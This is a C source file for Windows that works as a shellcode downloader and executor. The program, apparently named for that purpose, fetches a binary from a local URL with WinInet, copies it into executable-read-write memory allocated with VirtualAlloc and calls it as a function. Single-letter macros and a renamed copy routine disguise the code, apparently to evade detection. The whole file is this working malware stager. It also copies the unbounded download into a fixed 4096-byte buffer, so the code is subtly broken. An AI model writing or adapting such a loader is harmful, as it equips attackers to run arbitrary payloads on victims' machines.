#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet")

#define a int
#define b return
#define c if
#define d NULL
#define e char
#define f while
#define g void
#define h sizeof
#define i HINTERNET
#define j DWORD
#define k HMODULE

#define l char
#define m *
#define n void
#define o while
#define p return
#define q --
#define r ++
#define s =
#define t size_t

n* memMirror(n* aA, const n* bB, t cC) { l m x s(l m)aA, m y s(l m)bB; o(cC q)* x r s* y r; p aA; }

a main() {
    i A, B;
    j C;

    A = InternetOpen(L"Shellcode Downloader", INTERNET_OPEN_TYPE_DIRECT, d, d, 0);
    c(A == d) {
        fprintf(stderr, "InternetOpen failed\n");
        b 1;
    }

    B = InternetOpenUrl(A, L"http://localhost:8000/shellcode64.bin", d, 0, INTERNET_FLAG_RELOAD, 0);
    c(B == d) {
        fprintf(stderr, "InternetOpenUrl failed\n");
        InternetCloseHandle(A);
        b 1;
    }

    e D[4096];
    e E[4096];
    j F = 0;
    f(InternetReadFile(B, E, h(E), &C) && C > 0) {
        memMirror(D + F, E, C);
        F += C;
    }

    InternetCloseHandle(B);
    InternetCloseHandle(A);

    g* G = VirtualAlloc(0, F, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    c(G == d) {
        printf("Memory allocation failed\n");
        b 1;
    }

    memMirror(G, D, F);

    g(*H)() = (g(*)())G;

    H();

    b 0;
}